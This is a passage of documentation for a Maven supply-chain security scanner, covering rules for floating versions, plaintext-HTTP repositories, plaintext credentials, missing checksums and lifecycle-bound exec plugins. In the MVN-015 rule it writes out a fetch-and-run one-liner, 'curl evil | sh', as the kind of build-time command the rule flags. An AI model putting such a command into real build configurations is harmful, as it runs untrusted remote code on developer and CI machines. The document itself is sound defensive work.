# maven provider

Parses Maven `pom.xml` project descriptors and per-user / per-CI
`settings.xml` files on disk. Text-only static analysis, no
`mvn install`, no Maven Central API access, no resolver run. Rule
modules see a parsed `PomFile` (dependencies, repositories,
properties, mirrors) and flag the patterns that produced the
Log4Shell (Dec 2021), Spring4Shell (March 2022), and Text4Shell (Oct
2022) historical incidents.

## Producer workflow

```bash
# --maven-path is auto-detected when pom.xml exists at cwd.
pipeline_check --pipeline maven

# …or pass it explicitly.
pipeline_check --pipeline maven --maven-path pom.xml

# Recursively scan a multi-module reactor: every pom.xml under the
# path (excluding ``target/`` and ``.m2/``) is picked up.
pipeline_check --pipeline maven --maven-path .
```

## Scope

* `pom.xml` (project descriptor, both top-level and submodule)
* `settings.xml` (per-user / per-CI Maven config, scanned for
  `<mirrors>` posture)
* `<dependencyManagement>` entries are surfaced separately from real
  dependencies so version-management blocks don't trigger consumption-
  side rules.

`gradle.lockfile`, `build.gradle`, and `build.gradle.kts` are out of
scope for the initial pack; a separate `gradle` provider is queued
for a follow-up. The Maven half covers Maven Central and any
Maven-compatible registry (Nexus, Artifactory, GitHub Packages) the
project resolves through `pom.xml`.

## Property resolution

Single-level `${prop}` substitution against the POM's `<properties>`
block is performed before each rule evaluates a version literal, so a
property pointing at a floating range or a known-compromised version
still trips the relevant rule. Nested substitution is intentionally
left unresolved; deeply-recursive property graphs are rare in
real-world POMs and out of scope for static analysis.

## What it covers

18 checks · 0 have an autofix patch (``--fix``).

| Check | Title | Severity | Fix |
|-------|-------|----------|-----|
| [MVN-001](#mvn-001) | pom.xml dependency uses a floating version range | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-002](#mvn-002) | pom.xml depends on a mutable SNAPSHOT version | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-003](#mvn-003) | pom.xml declares a plaintext-HTTP Maven repository | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-004](#mvn-004) | pom.xml dependency omits an explicit ``<version>`` | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-005](#mvn-005) | Maven repository accepts artifacts without strict checksum gating | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-006](#mvn-006) | pom.xml pins a known-compromised Maven Central artifact version | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [MVN-007](#mvn-007) | settings.xml mirror routes external traffic through one repo | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-008](#mvn-008) | Direct dependency was published within the cooldown window | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-009](#mvn-009) | Maven artifact has a known OSV advisory | <span class="pg-sev pg-sev--critical">CRITICAL</span> |  |
| [MVN-010](#mvn-010) | settings.xml <server> carries a plaintext password | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-011](#mvn-011) | Maven repository URL embeds plaintext credentials | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-012](#mvn-012) | pom.xml build plugin uses a floating version | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-013](#mvn-013) | pom.xml build extension uses a floating version | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-014](#mvn-014) | Maven Wrapper distributionUrl lacks distributionSha256Sum | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |
| [MVN-015](#mvn-015) | pom.xml binds a build-time code-execution plugin to the lifecycle | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-016](#mvn-016) | build.gradle re-enables HTTP via allowInsecureProtocol = true | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-017](#mvn-017) | settings.xml <server> ships a private key with an inline passphrase | <span class="pg-sev pg-sev--high">HIGH</span> |  |
| [MVN-018](#mvn-018) | distributionManagement release repository accepts SNAPSHOTs | <span class="pg-sev pg-sev--medium">MEDIUM</span> |  |

---

<div class="pg-rule pg-rule--medium" markdown>

## MVN-001: pom.xml dependency uses a floating version range { #mvn-001 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Fires on any ``<version>`` value that matches the Maven range grammar: bracket-or-paren-delimited intervals (``[1.0,2.0)``, ``(,3.0]``), open ranges (``[1.0,)``), or the legacy floating tokens ``LATEST`` / ``RELEASE``. Property references (``${spring.version}``) are resolved against the POM's ``<properties>`` block before the check runs, so a property pointing at a range still fires.

Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (that's MVN-004's surface) because the version-management section's purpose is to centralize version literals, not consume them at install time.

**Known false-positive modes**

- Multi-module reactor builds sometimes legitimately use ``${project.version}`` (the reactor's own version) which resolves to a plain string from the parent POM. The rule honors property substitution so this passes; if it does fire on a deliberate range (e.g. a build-time tool pulled via a range you control), suppress with a one-line rationale.

**Seen in the wild**

- Codecov Bash Uploader compromise (April 2021): downstream builds pulling Codecov via mutable references shipped the tampered uploader for two months. The Maven-side analog is any range-pinned ``codecov`` / scanner / agent jar; same exposure window. https://about.codecov.io/security-update/

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace Maven version ranges (``[1.0,2.0)``, ``[1.0,)``, ``LATEST``, ``RELEASE``) with an exact version pin (``<version>1.2.3</version>``). The range form lets Maven pick any later release that fits, so a compromised patch version reaches the build without a code change. Pair the exact-pin manifest with a verified-by-checksum or verified-by-signature repository policy (MVN-005) so a tampered jar at the same version literal still fails.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-002: pom.xml depends on a mutable SNAPSHOT version { #mvn-002 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Fires on any non-managed ``<version>`` ending in ``-SNAPSHOT`` (case-insensitive). Property references are resolved against the POM's ``<properties>`` first, so a property whose value ends in ``-SNAPSHOT`` still trips the rule. ``<dependencyManagement>`` entries are exempt; centralized version literals are MVN-004's surface.

**Known false-positive modes**

- Multi-module reactor builds where every sibling references ``${project.version}-SNAPSHOT`` during local development. Suppress in your local profile or scope the scan to the release POM; gating release builds on SNAPSHOT-free deps is exactly what this rule is for.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace ``-SNAPSHOT`` versions with a released, immutable version (``1.2.3``, not ``1.2.3-SNAPSHOT``). Maven treats SNAPSHOT artifacts as mutable: the repository can re-deploy the same coordinate, and ``mvn install`` will pull whatever is current at resolution time. Snapshot dependencies belong to the development inner loop; gate them out of release builds and CI build pipelines.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-003: pom.xml declares a plaintext-HTTP Maven repository { #mvn-003 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-319</span>
</div>

Fires on any ``<repository>``, ``<pluginRepository>``, or ``<distributionManagement>`` URL using the ``http://`` scheme. ``file://`` and ``https://`` are exempt. The rule evaluates both project POMs and per-user / per-CI ``settings.xml`` mirror entries via the orchestrator.

**Known false-positive modes**

- Internal Maven repositories on a fully-isolated build network sometimes legitimately serve over HTTP. If you can actually attest that the network path is end-to-end untamperable (a single-tenant air-gapped subnet), suppress with a rationale naming that boundary.

**Seen in the wild**

- Maven Central enforced HTTPS-only for the central repository in January 2020; the legacy ``http://repo1.maven.org`` endpoint was retired specifically because of MITM-tampering attacks against downstream consumers. https://blog.sonatype.com/central-repository-moving-to-https

<div class="pg-rule__rec" markdown>

**Recommended action**

Change every ``<repository><url>`` to ``https://`` and delete any ``<repository>`` whose host doesn't expose TLS. Plaintext-HTTP repositories let a network attacker swap downloaded jars in flight (the canonical Maven supply-chain MITM attack); ``https://`` plus the repository's published checksums (MVN-005) is the minimum baseline.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-004: pom.xml dependency omits an explicit ``<version>`` { #mvn-004 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span>
</div>

Fires on any non-managed ``<dependency>`` whose ``<version>`` element is absent or empty. Managed entries in ``<dependencyManagement>`` are the *source* of the version and intentionally out of scope for the entire Maven rule pack (MVN-001 / MVN-002 / MVN-004 all iterate ``iter_real_dependencies(...)``, which skips managed entries) — a BOM-style version-management block is its own surface and is audited via the inherited POM.

**Known false-positive modes**

- Spring Boot starters and other BOM-managed dependencies intentionally omit ``<version>`` so the imported BOM decides. The rule still fires because the BOM is not visible at static-analysis time; suppress with a rationale naming the BOM POM, or import the BOM explicitly into this project's ``<dependencyManagement>``.

<div class="pg-rule__rec" markdown>

**Recommended action**

Every ``<dependency>`` must carry a ``<version>``, either inline or via a ``<dependencyManagement>`` block in this POM or a parent. Implicit-version dependencies inherit whatever Maven resolves at build time (often the highest available release), so a maintainer push to a higher version reaches the build unobserved. If the version is genuinely managed by a parent POM, declare it in this POM's ``<dependencyManagement>`` so the resolved version is at least pinned at the project level.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-005: Maven repository accepts artifacts without strict checksum gating { #mvn-005 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-353</span>
</div>

Fires when any ``<repository>`` / ``<pluginRepository>`` declares ``<checksumPolicy>warn</checksumPolicy>`` or ``<checksumPolicy>ignore</checksumPolicy>`` (explicitly weakened from the default), or when the policy is absent AND the URL is not Maven Central (Central enforces checksums server-side, so the policy is moot for that single repo). Internal mirrors and third-party repositories are the canonical place this rule fires.

**Known false-positive modes**

- Internal artifact repositories with server-side checksum verification (a Nexus / Artifactory deployment configured to reject mismatched uploads) functionally meet the control even with ``warn`` at the client. The rule cannot see the server-side policy; suppress with a rationale naming the platform / version that enforces it.

<div class="pg-rule__rec" markdown>

**Recommended action**

On every ``<repository>``, set ``<checksumPolicy>fail</checksumPolicy>`` under both ``<releases>`` and ``<snapshots>``. Maven's default policy is ``warn``: a checksum mismatch logs a line and the build continues with the tampered artifact. ``fail`` halts on any mismatch, which is the only setting that actually gates the build on checksum integrity. For Maven 3.9.x and newer, prefer the global ``-C`` / ``-c`` invocation flag in CI plus per-repo ``fail`` so a missing checksumPolicy doesn't downgrade to warn at runtime.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## MVN-006: pom.xml pins a known-compromised Maven Central artifact version { #mvn-006 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-1395</span>
</div>

Walks every non-managed dependency against the curated compromised-package registry in ``pipeline_check.core.checks.maven._compromised_packages``. Group/artifact matching is case-insensitive; version matching is exact (with optional regex fallback for advisories that span a range). Property references are resolved against the POM's ``<properties>`` block so ``${log4j.version}`` is checked against its resolved value. ``<dependencyManagement>`` entries are skipped to avoid double-counting when the same coordinate is both managed and consumed.

**Known false-positive modes**

- The registry covers only public, advisory-confirmed compromises and a small set of canonical CVE-mapped vulnerable versions (Log4Shell, Spring4Shell, Text4Shell). For broader CVE coverage, run a dependency-vulnerability scanner (OWASP Dependency-Check, Snyk, Trivy) alongside pipeline-check; MVN-006 is the curated supply-chain anchor.

**Seen in the wild**

- Log4Shell, CVE-2021-44228 (December 2021): the canonical Maven-side ecosystem-wide RCE. Mass exploitation began within hours of public disclosure. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Spring4Shell, CVE-2022-22965 (March 2022): RCE via the spring-beans data-binding path on JDK 9+ WAR deployments. https://nvd.nist.gov/vuln/detail/CVE-2022-22965

<div class="pg-rule__rec" markdown>

**Recommended action**

Bump the affected dependency to a post-incident clean version announced in the citing advisory. For Log4Shell and Spring4Shell class CVEs, rotate any secret reachable to production processes during the exposure window (most Maven-side advisories enable unauthenticated RCE on the deployed app, so any in-process credential should be considered exposed). Pair with MVN-005 (strict checksum policy) so future bytes published at the same coordinate are rejected, and with a vuln-scanning step (Snyk, Dependency-Check) for breadth beyond the curated registry.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-007: settings.xml mirror routes external traffic through one repo { #mvn-007 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Fires on any ``<mirror>`` in a ``settings.xml`` whose ``<mirrorOf>`` value is ``*`` or ``external:*`` (the two patterns that capture arbitrary external traffic). Repository-specific patterns (``central``, ``!internal-only,*``) and explicit allowlists are exempt. Project POMs that don't carry a ``<mirrors>`` block silently pass.

**Known false-positive modes**

- Single-team artifact-proxy patterns (one Nexus / Artifactory acting as the universal upstream front) legitimately use ``<mirrorOf>*</mirrorOf>`` and rely on the proxy's own access controls. If the proxy is a controlled artifact-allowlist target rather than a passthrough, suppress with a rationale naming the proxy endpoint and the allowlist that gates it.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace ``<mirrorOf>*</mirrorOf>`` and ``<mirrorOf>external:*</mirrorOf>`` with a narrowly-scoped list naming the upstream repositories you actually want to redirect (``central``, ``central,jcenter``). A wildcard mirror routes every dependency, including ones declared by transitive POMs the build hasn't approved, through the mirror operator: a single compromise of that mirror compromises every artifact the build resolves. Pin the mirror URL to ``https://`` and audit the mirror operator's publishing controls.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-008: Direct dependency was published within the cooldown window { #mvn-008 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-494</span>
</div>

Network-dependent: needs ``--resolve-remote`` to populate the per-coordinate publish timestamps from the Maven Central search API (``https://search.maven.org/solrsearch/select``). Walks every non-managed ``<dependency>`` with an explicit ``<version>``; flags ones whose ingest timestamp on Central falls inside the cooldown window (default 7 days). ``<dependencyManagement>`` entries are skipped (those are version-management declarations, not real consumption). ``${prop}`` substitution against the POM's ``<properties>`` block is resolved before the lookup so ``${log4j.version}`` is checked against its resolved value. ``-SNAPSHOT`` and Maven version-range literals (``[1.0,2.0)``, ``LATEST``, ``RELEASE``) are out of scope — the cooldown applies to a specific released coordinate. When ``--resolve-remote`` is off or Central can't be reached, the rule passes silently so the absence of the network path doesn't trip CI.

**Known false-positive modes**

- Internally-published artifacts hosted on a private Sonatype Nexus / JFrog Artifactory instance won't appear in Central's search API and are silently skipped. The cooldown gate is a Central-only signal; vendor- or org- internal release trains are out of scope and shouldn't be suppressed (they simply don't fire).
- Same-day patch upgrades from a maintainer the team directly trusts (e.g. an internal fork republished to Central under a corporate group ID) are flagged. Suppress per-resource via ``--ignore-file`` — the cooldown is a default-safe gate, not a hard rule.

**Seen in the wild**

- Log4Shell, CVE-2021-44228 (December 2021): public disclosure on 2021-12-09 triggered Apache's emergency 2.15.0 release the same day; mass exploitation began within hours. Consumers who held even a 1-day cooldown on the affected versions would have caught the upstream advisory before bumping. https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- Sonatype Lift abuse / typosquat campaigns (2022-2024): periodic surfacing of typosquat coordinates (``org.apaache.*``) pushed to Central, typically yanked within 48 hours of report. A cooldown of any meaningful length would skip them.

<div class="pg-rule__rec" markdown>

**Recommended action**

Either skip the just-published version (pin to the last release older than the cooldown window) or wait until the cooldown has elapsed before bumping the POM. Publisher- account compromises on Maven Central are rarer than on npm / PyPI, but the takedown window is the same shape: Sonatype yanks malicious artifacts within hours-to-days once an advisory lands; holding back N days converts a publisher-compromise window into a vulnerability- disclosure window where either the maintainer rotates the malicious release off Central or the security community files a CVE that MVN-006 can match against.

</div>

</div>

<div class="pg-rule pg-rule--critical" markdown>

## MVN-009: Maven artifact has a known OSV advisory { #mvn-009 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-8</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-829</span> <span class="pg-tag pg-tag--cwe">CWE-506</span>
</div>

Network-dependent: needs ``--resolve-remote`` to query the OSV advisory database (``api.osv.dev``). Passes silently when the flag is off. Complements MVN-006 (curated offline registry) with the full OSV/GHSA long-tail.

<div class="pg-rule__rec" markdown>

**Recommended action**

Upgrade to a patched version or remove the affected artifact. Consult the advisory URL for remediation guidance.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-010: settings.xml <server> carries a plaintext password { #mvn-010 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-10</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
</div>

Reads ``<settings><servers><server>`` entries and fires when ``<password>`` carries a plaintext value (anything that's not the Maven-encrypted ``{...}`` form, an empty string, or an ``${...}`` property expansion). The Maven-encrypted form is a base64-encoded opaque token wrapped in literal curly braces; the password decrypts at build time using the master in ``settings-security.xml``.

Property-expansion forms (``${env.MY_TOKEN}``, ``${deploy.token}``) pass the rule because the actual value lives outside the file. CI-injected forms via environment variables are the safest pattern.

**Known false-positive modes**

- Sandbox / playground settings.xml files used only for local testing against a public mirror may legitimately carry placeholder values that look like plaintext passwords. Suppress per file with a rationale; production settings.xml should never carry plaintext.

**Seen in the wild**

- Long-running pattern of internal Nexus / Artifactory credentials leaking through settings.xml files committed to public mirrors. Maven's own documentation has highlighted password encryption since Maven 2.1 (2008); the plaintext shape is a posture / migration gap that tooling like this one's value is to surface at audit time.

<div class="pg-rule__rec" markdown>

**Recommended action**

Replace every plaintext ``<password>`` inside ``<settings><servers><server>`` with a Maven-encrypted value. The remediation flow is:

1. Generate a master password: ``mvn --encrypt-master-password <master>``. Store the result in ``~/.m2/settings-security.xml`` under ``<settingsSecurity><master>``.
2. Encrypt the per-server password: ``mvn --encrypt-password <real-password>``. The output is a ``{...}``-wrapped opaque token.
3. Paste the token into the ``<password>`` element of the ``<server>`` block. Maven decrypts it at build time using the master from ``settings-security.xml``.

For CI environments, prefer injecting the password via environment variable or CI secret manager: Maven 3.6+ expands ``${env.MY_DEPLOY_TOKEN}`` inside settings.xml at read time, so the value never lives on disk. The plaintext form in settings.xml leaves the credential committed to any repository the file is checked into and persists in git history indefinitely.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-011: Maven repository URL embeds plaintext credentials { #mvn-011 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-6</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-10</span> <span class="pg-tag pg-tag--esf">ESF-D-SECRETS</span> <span class="pg-tag pg-tag--cwe">CWE-798</span> <span class="pg-tag pg-tag--cwe">CWE-522</span>
</div>

Walks every ``<repository><url>``, ``<pluginRepository><url>``, ``<distributionManagement><repository><url>``, and settings.xml ``<mirror><url>`` for an embedded ``user:pass@`` authority. Empty-password forms (``https://user:@host``) and ``${var}`` placeholders are skipped, the former is an operator-flagged 'no credential intended' marker and the latter resolves at build time from the environment.

Distinct from MVN-003 (HTTP scheme — transport risk) and MVN-010 (settings.xml ``<server><password>`` — different credential location). All three failure modes can coexist.

**Known false-positive modes**

- Some internal templating tools emit a placeholder credential form (``https://__TOKEN__:@host``) and substitute the real value at build time. The rule's placeholder skip-list only recognizes ``${...}``; suppress per file when the template marker is stable.

**Seen in the wild**

- Common pattern across enterprise Maven projects: a contributor pastes a deploy-bot URL with embedded credentials into pom.xml during a quick test, intends to replace it before commit, the replacement never happens. The repo's git history retains the credential after the fact even if the next commit cleans the file.

<div class="pg-rule__rec" markdown>

**Recommended action**

Strip the credential out of every repository / mirror URL and move it into a ``<server>`` entry in ``~/.m2/settings.xml``. Maven matches the server entry to the repository by ``<id>``:

    <!-- pom.xml -->
    <repositories>
      <repository>
        <id>corp-nexus</id>
        <url>https://nexus.corp.example/repo/</url>
      </repository>
    </repositories>

    <!-- ~/.m2/settings.xml -->
    <servers>
      <server>
        <id>corp-nexus</id>
        <username>deploy-bot</username>
        <password>{encrypted-form}</password>
      </server>
    </servers>

The settings.xml entry lives outside the project repo and uses the Maven-encrypted password form (see MVN-010). URL-embedded credentials in pom.xml or settings.xml mirror entries land directly in git history; rotation requires a history scrub before the leaked value stops being useful.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-012: pom.xml build plugin uses a floating version { #mvn-012 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Re-parses ``pom.xml`` and walks every ``<build><plugins><plugin>``, ``<build><pluginManagement><plugins><plugin>``, and ``<profile><build><plugins><plugin>`` entry. Fires when the ``<version>`` element is missing, uses a Maven range (``[1.0,2.0)`` / ``[1.0,)``), is a legacy floating literal (``LATEST`` / ``RELEASE``), or uses a property whose resolved value is itself floating (``${plugin.version}`` resolved via ``<properties>``).

Distinct from MVN-001 (regular ``<dependencies>`` floating versions): the consumer-side impact of a compromised plugin is significantly broader because plugins execute at build time, not just at app runtime.

**Known false-positive modes**

- Multi-module reactor builds sometimes use ``${project.version}`` (the reactor's own version) on a plugin that's distributed alongside the reactor — this is a legitimate exact-pin even though the literal looks property-shaped. The rule resolves property references against ``<properties>`` before evaluating so this case passes when the property is concrete. A property that isn't defined in the same POM stays unresolved and the rule conservatively skips it.

**Seen in the wild**

- Maven Central plugin compromises have a multiplier effect: every downstream build using a floating range picks up the malicious patch automatically. Notable historical examples include the ``codecov`` patch-version compromise (April 2021) and pattern reports against widely-used build plugins where the maintainer account is briefly compromised.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every ``<build><plugins><plugin>`` (and ``<pluginManagement>``) entry to an exact version. Maven plugins run code during the build lifecycle (compile, package, install, deploy phases), so a compromised patch release of a popular plugin executes in the build environment before any runtime sandbox is in place — and inherits whatever privileges the build process has (CI runner write access, deploy keys, AWS credentials).

Even more critical than dependency pinning (MVN-001): dependencies usually only run code in production via the application that uses them; plugins run code at build time on every developer's machine and every CI runner. The xz-utils style patch-release smuggle pattern is directly applicable to any plugin without an exact pin.

Example:

    <plugin>
      <groupId>org.apache.maven.plugins</groupId>
      <artifactId>maven-shade-plugin</artifactId>
      <version>3.5.1</version>
    </plugin>

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-013: pom.xml build extension uses a floating version { #mvn-013 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-7</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-1357</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Re-parses ``pom.xml`` and walks every ``<build><extensions><extension>`` (and the equivalent inside ``<profile><build>``). Fires on the same floating shapes MVN-012 catches for plugins: missing ``<version>``, Maven range (``[1.0,2.0)`` / ``[1.0,)``), legacy floating literals (``LATEST`` / ``RELEASE``).

Distinct from MVN-012 (plugins) because extensions load earlier in the Maven lifecycle and have different remediation guidance (extensions are usually wagons / lifecycle providers, not build-step actors).

**Known false-positive modes**

- Library projects that consume their own snapshot versions in a multi-module reactor may legitimately use ``${project.version}`` on an extension. The rule resolves property references against ``<properties>`` before evaluating, so the case passes when the property is concrete.

**Seen in the wild**

- Maven Central extension compromises follow the same patch-release-smuggle pattern as plugins. Because extensions load before plugins, a malicious extension can also tamper with the plugin loading process, amplifying the blast radius beyond what the extension itself does.

<div class="pg-rule__rec" markdown>

**Recommended action**

Pin every ``<build><extensions><extension>`` entry to an exact version. Build extensions load during Maven's early-init phase — *before* any plugin runs — and can register custom lifecycle phases, deployment protocols, or POM resolvers. A compromised extension patch release executes in the build environment with the same privileges any other build code would have, and runs on every developer's machine and every CI runner.

Example:

    <build>
      <extensions>
        <extension>
          <groupId>org.apache.maven.wagon</groupId>
          <artifactId>wagon-ssh</artifactId>
          <version>3.5.3</version>
        </extension>
      </extensions>
    </build>

Extensions are less commonly used than plugins but carry the same patch-release-smuggle risk; the limited surface (most projects use 0 or 1 extensions) makes pinning them a trivial maintenance cost.

</div>

</div>

<div class="pg-rule pg-rule--medium" markdown>

## MVN-014: Maven Wrapper distributionUrl lacks distributionSha256Sum { #mvn-014 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-494</span> <span class="pg-tag pg-tag--cwe">CWE-345</span>
</div>

Reads ``.mvn/wrapper/maven-wrapper.properties`` (Java properties format: ``key=value`` lines) in the same directory as each ``pom.xml`` and fires when ``distributionUrl`` is set but ``distributionSha256Sum`` is missing. Projects that don't ship the Maven Wrapper (no properties file) pass silently — the wrapper is optional and absent files aren't a posture risk.

The Maven Wrapper, like Gradle's, downloads its own build tool on first invocation. Hash verification at the wrapper layer closes the supply-chain gap that would otherwise require trusting the URL + TLS chain alone.

**Known false-positive modes**

- Wrapper configurations that use a non-HTTPS internal mirror sometimes deliberately omit the hash because the mirror's content can change. The right fix is to freeze the mirror's distribution to a specific Maven release and pin its hash, but suppression with a rationale is acceptable in the interim.

**Seen in the wild**

- Maven Wrapper compromise pattern: an internal mirror serves a tampered Maven distribution; consumers who use the wrapper without ``distributionSha256Sum`` accept the tampered bytes and run them as their build tool. The hash entry catches this at download time before the malicious Maven ever extracts.

<div class="pg-rule__rec" markdown>

**Recommended action**

Add a ``distributionSha256Sum`` entry to ``.mvn/wrapper/maven-wrapper.properties`` matching the SHA-256 of the Maven distribution at ``distributionUrl``:

    distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/3.9.6/apache-maven-3.9.6-bin.zip
    distributionSha256Sum=<64-char-sha256>

The hash is published at the distribution URL plus ``.sha256`` (or available from Apache's release manifest). The wrapper verifies the downloaded archive's hash before extracting; without the entry, the wrapper trusts whatever bytes the URL serves at download time — fine when the URL is the canonical Apache repo and the connection is HTTPS, but unrecoverable when an internal mirror is compromised or a network MITM intercepts the download.

Modern ``mvn wrapper:wrapper`` invocations support a ``-Dtype=script`` mode that adds the hash automatically.

</div>

</div>

<div class="pg-rule pg-rule--high" markdown>

## MVN-015: pom.xml binds a build-time code-execution plugin to the lifecycle { #mvn-015 }

<div class="pg-rule__tags">
<span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-1</span> <span class="pg-tag pg-tag--owasp">CICD-SEC-3</span> <span class="pg-tag pg-tag--esf">ESF-S-VERIFY-DEPS</span> <span class="pg-tag pg-tag--cwe">CWE-94</span> <span class="pg-tag pg-tag--cwe">CWE-829</span>
</div>

Re-parses ``pom.xml`` and walks ``<build><plugins><plugin>``, ``<build><pluginManagement>``, and ``<profile><build>`` plugins. Fires when a known command-running plugin (``exec-maven-plugin``, ``maven-antrun-plugin``, ``gmavenplus-plugin``, ``groovy-maven-plugin``, ``frontend-maven-plugin``) carries at least one ``<executions><execution>`` binding, which is what wires it into the build lifecycle so it runs automatically.

Distinct from MVN-012, which only checks that a plugin's ``<version>`` is pinned. A plugin can be perfectly pinned and still execute ``curl evil | sh`` from its configuration; MVN-012 passes it, MVN-015 catches the lifecycle binding. Scoped to ``pom.xml`` (Gradle's equivalent ``exec`` / ``JavaExec`` tasks are a separate surface).

**Known false-positive modes**

- Lifecycle-bound code generation is common and often legitimate (``frontend-maven-plugin`` building a JS bundle, ``exec-maven-plugin`` running a checked-in generator). The rule flags the build-time-execution surface so a reviewer can confirm the command and its inputs are trusted and constant; suppress per pom with a rationale once verified.

**Seen in the wild**

